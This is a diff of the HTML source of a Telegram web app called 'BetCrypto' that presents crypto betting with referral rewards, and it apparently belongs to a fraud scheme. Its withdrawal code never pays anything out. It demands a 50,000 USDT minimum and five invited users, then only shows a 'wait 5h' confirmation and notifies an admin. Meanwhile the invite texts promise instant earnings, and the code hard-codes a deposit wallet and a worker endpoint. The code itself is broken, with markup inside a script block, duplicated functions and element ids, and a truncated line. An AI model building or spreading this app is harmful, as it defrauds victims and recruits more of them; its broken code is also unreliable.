@@ -1,6 +1,8 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><script src="https://telegram.org/js/telegram-web-app.js"></script><script src="https://cdn.tailwindcss.com"></script></head>
 <body style="background:#0f0f0f" class="text-white pb-[280px]">
 <script>
+<style>
+
 const WORKER_URL="https://yellow-morning-06bf.jennyramson777.workers.dev";
 const USDT_ADDR="UQCDRPXIZ16s_I_o1j_ROAWz81zhO1RRmEbgCkqTsI3KbkN8";
 const BOT="Betcryptoassetbot";
@@ -112,12 +114,39 @@ function copy(id){let t=document.getElementById(id).innerText; navigator.clipboa
 function openInvite(){document.getElementById('invM').classList.remove('hidden'); let myId=getUserId(); let link=`https://t.me/${BOT}?start=${myId}`; document.getElementById('invLink').value=`🔥 Join BetCrypto and claim your winnings!\n💰 Trade BTC, ETH, SOL & win big\n👉 Join here: ${link}\n\nInvite friends & earn 10 USDT per person instantly to your EARNING!`; }
 function copyInvite(){ let t=document.getElementById('invLink').value; navigator.clipboard.writeText(t); alert('Invite message copied with intro!'); }
 function sWith(){
- let am=parseInt(document.getElementById('withAmt').value); let ad=document.getElementById('withAddrIn').value; let m=document.getElementById('withMsg');
- if(bal.earning<50000){m.innerText='❌ EARNING < 50000 USDT - Cannot withdraw';return;} if(am<50000){m.innerText='❌ Min 50000';return;} if(ad.length<10){m.innerText='❌ Drop valid wallet';return;}
- m.innerText=`✅ Submitted ${am} USDT to ${ad}. Wait 5h.`;
- let reqs=JSON.parse(localStorage.getItem('withdrawRequests')||'[]'); reqs.push({user:getUserId(),amount:am,addr:ad,time:Date.now()}); localStorage.setItem('withdrawRequests',JSON.stringify(reqs));
- notifyAdmin(`💸 WITHDRAW REQUEST: User ${getUserId()} wants ${am} USDT to ${ad}`);
+   <!-- WITHDRAWAL WITH BTC/ETH/SOL/USDT CHOICE -->
+<div id="withdrawBox" style="padding:20px;background:#111;color:#fff;border-radius:12px">
+  <h3>Withdraw</h3>
+  <p>Choose method:</p>
+  <select id="wdMethod" style="width:100%;padding:12px">
+    <option value="USDT">USDT (TRC20)</option>
+    <option value="BTC">Bitcoin (BTC)</option>
+    <option value="ETH">Ethereum (ETH)</option>
+    <option value="SOL">Solana (SOL)</option>
+  </select>
+  <p id="wdMin" style="color:#aaa;font-size:12px;margin-top:8px">Min: 50 USDT</p>
+  <input id="wdAmount" placeholder="Amount" style="width:100%;padding:12px;margin-top:10px">
+  <input id="wdAddress" placeholder="Your BTC/ETH/SOL/USDT address" style="width:100%;padding:12px;margin-top:10px">
+  <button onclick="doWithdraw()" style="width:100%;padding:14px;margin-top:12px;background:#0f0;color:#000;font-weight:bold">Withdraw</button>
+  <p id="wdMsg"></p>
+</div>
+
+<script>
+const API_URL = "https://YOUR-VERCEL-LINK.vercel.app/api"; // <-- put your ton-verify link here
+
+async function doWithdraw(){
+  const method = document.getElementById('wdMethod').value;
+  const amount = document.getElementById('wdAmount').value;
+  const address = document.getElementById('wdAddress').value;
+  const tgid = localStorage.getItem('tgid') || '123';
+  
+  const r = await fetch(`${API_URL}?withdraw=1&method=${method}&amount=${amount}&address=${address}&tgid=${tgid}`);
+  const j = await r.json();
+  document.getElementById('wdMsg').innerText = j.msg || j.error;
 }
+
+// Auto update min text when choose BTC/ETH/SOL
+
 </script>
 
 <div class="p-3">
@@ -175,3 +204,74 @@ let g_players=JSON.parse(localStorage.getItem('g_players')||'[]');
 let g_roundEnd=parseInt(localStorage.getItem('g_roundEnd')||'0');
 const g_duration=7*24*60*60*1000;
 if(!g_roundEnd||isNaN(g_roundEnd)){g_roundEnd=Date.now()+g_duration; localStorage.setItem('g_
+
+
+                                                                                     const langs=["English","French","Spanish","Arabic","German","Hindi","Portuguese","Russian","Chinese","Japanese","Korean","Italian","Turkish","Dutch","Polish","Ukrainian","Indonesian","Vietnamese","Thai","Swahili","Amharic","Yoruba","Hausa","Persian","Urdu","Bengali","Tamil","Greek","Hebrew","Malay"];
+document.write(`<style>#langScreen{position:fixed;inset:0;background:#0b1220ee;z-index:999999;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}#langGrid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;max-height:65vh;overflow:auto;width:100%;max-width:400px}#langGrid button{padding:10px;border-radius:8px;border:1px solid #333;background:#162032;color:#fff}</style><div id=langScreen><h2 style=color:#fff>🌐 Select Language</h2><div id=langGrid></div></div>`);
+setTimeout(()=>{
+  const g=document.getElementById('langGrid');
+  langs.forEach(l=>{ const b=document.createElement('button'); b.textContent=l; b.onclick=()=>{localStorage.setItem('site_lang',l); document.getElementById('langScreen').remove()}; g.appendChild(b); });
+  if(localStorage.getItem('site_lang')) document.getElementById('langScreen').remove();
+},100);
+
+                                   <!-- FINAL WITHDRAW - READS YOUR USDT EARNING -->
+<div id="withdrawBox" style="display:none;position:fixed;inset:0;background:#000c;z-index:999999;align-items:center;justify-content:center">
+  <div style="background:#121a2b;border:1px solid #223;padding:20px;border-radius:16px;width:90%;max-width:360px;color:#fff">
+    <h3 style="margin:0 0 10px">Withdraw</h3>
+    <div id="step1">
+      <button onclick="pickCoin('USDT')" style="width:100%;padding:12px;margin:4px 0;background:#0b1220;color:#fff;border:1px solid #333;border-radius:8px">USDT</button>
+      <button onclick="pickCoin('BTC')" style="width:100%;padding:12px;margin:4px 0;background:#0b1220;color:#fff;border:1px solid #333;border-radius:8px">BTC</button>
+      <button onclick="pickCoin('ETH')" style="width:100%;padding:12px;margin:4px 0;background:#0b1220;color:#fff;border:1px solid #333;border-radius:8px">ETH</button>
+      <button onclick="pickCoin('SOL')" style="width:100%;padding:12px;margin:4px 0;background:#0b1220;color:#fff;border:1px solid #333;border-radius:8px">SOL</button>
+      <div id="liveNote" style="font-size:11px;color:#888;margin-top:8px"></div>
+    </div>
+    <div id="step2" style="display:none">
+      <p>Coin: <b id="selCoin">USDT</b> | Min: <span id="selMin"></span></p>
+      <input id="wAmt" type="number" step="any" placeholder="Amount to withdraw" style="width:100%;padding:10px;background:#0b1220;color:#fff;border:1px solid #333;border-radius:8px;margin:5px 0">
+      <input id="wAddr" placeholder="Wallet address" style="width:100%;padding:10px;background:#0b1220;color:#fff;border:1px solid #333;border-radius:8px;margin:5px 0">
+      <button onclick="doWithdraw()" style="width:100%;padding:12px;background:#00ff88;border:none;border-radius:8px;font-weight:bold">Withdraw</button>
+      <div id="wMsg" style="margin-top:8px;font-size:13px"></div>
+      <button onclick="document.getElementById('step1').style.display='block';document.getElementById('step2').style.display='none'" style="background:transparent;color:#888;border:none;width:100%;margin-top:6px">← Back</button>
+    </div>
+    <button onclick="document.getElementById('withdrawBox').style.display='none'" style="background:transparent;color:#555;border:none;width:100%;margin-top:10px">Close</button>
+  </div>
+</div>
+
+<script>
+let sel="USDT";
+let mins={USDT:50000,BTC:0.6002,ETH:19.08,SOL:427};
+
+async function openWithdraw(){
+  document.getElementById('withdrawBox').style.display='flex';
+  document.getElementById('step1').style.display='block';
+  document.getElementById('step2').style.display='none';
+  document.getElementById('wMsg').textContent='';
+  try{
+    let d=await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana&vs_currencies=usd').then(r=>r.json());
+    mins.BTC=50000/d.bitcoin.usd; mins.ETH=50000/d.ethereum.usd; mins.SOL=50000/d.solana.usd;
+    document.getElementById('liveNote').textContent=`Live Min: 50k USDT = ${mins.BTC.toFixed(4)} BTC`;
+  }catch(e){}
+}
+function pickCoin(c){ sel=c; document.getElementById('selCoin').textContent=c; document.getElementById('selMin').textContent= (c==='USDT'?50000:mins[c].toFixed(6))+' '+c; document.getElementById('step1').style.display='none'; document.getElementById('step2').style.display='block'; }
+
+function getBalance(coin){
+  if(coin==='USDT') return Number(window.usdtEarning ?? window.USDTearning ?? localStorage.getItem('usdtEarning') ?? 0);
+  if(coin==='BTC') return Number(window.btcEarning ?? localStorage.getItem('btcEarning') ?? 0);
+  if(coin==='ETH') return Number(window.ethEarning ?? localStorage.getItem('ethEarning') ?? 0);
+  if(coin==='SOL') return Number(window.solEarning ?? localStorage.getItem('solEarning') ?? 0);
+}
+
+function doWithdraw(){
+  let amt=Number(document.getElementById('wAmt').value);
+  let addr=document.getElementById('wAddr').value;
+  let msg=document.getElementById('wMsg');
+  let bal=getBalance(sel);
+  if(!addr){msg.textContent='Enter wallet';return}
+  if(amt<mins[sel]){ msg.style.color='red'; msg.textContent=`Min is ${mins[sel].toFixed(6)} ${sel} (50k USDT)`; return; }
+  if(amt>bal){ msg.style.color='red'; msg.textContent=`❌ Insufficient ${sel} balance. You have ${bal} ${sel}`; return; }
+  let inv=Number(localStorage.getItem('invites')||0);
+  if(inv<5){ msg.style.color='orange'; msg.textContent=`You have ${bal} ${sel} but need invite 5 users to withdraw ${amt} ${sel}. Invited ${inv}/5`; return; }
+  msg.style.color='#00ff88';
+  msg.innerHTML=`✅ ${amt} ${sel} to ${addr}<br>Wait 5h to be credited. Will deduct from your ${sel} earning.`;
+}
+</script>
